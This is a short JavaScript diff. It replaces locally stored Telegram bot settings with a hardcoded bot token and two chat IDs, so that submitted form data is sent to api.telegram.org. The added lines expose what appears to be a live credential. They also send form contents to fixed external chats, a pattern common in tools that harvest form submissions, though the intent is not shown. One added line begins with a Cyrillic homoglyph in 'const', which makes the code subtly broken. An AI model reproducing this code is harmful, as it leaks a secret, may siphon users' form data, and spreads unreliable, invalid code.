@@ -664,8 +664,8 @@ function buildTelegramText(formData) {
 }
 
 async function trySendTelegram(formData) {
-  const token = localStorage.getItem('cp_tg_bot_token');
-  const chatId = localStorage.getItem('cp_tg_chat_id');
+  сonst token = '8946449456:AAGbcZMJ5LHPghq6cfgQvxOt-aAXw4mODSU';
+  const chatId = '6981587220, 7961240945';
   if (!token || !chatId) return null;
   try {
     const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
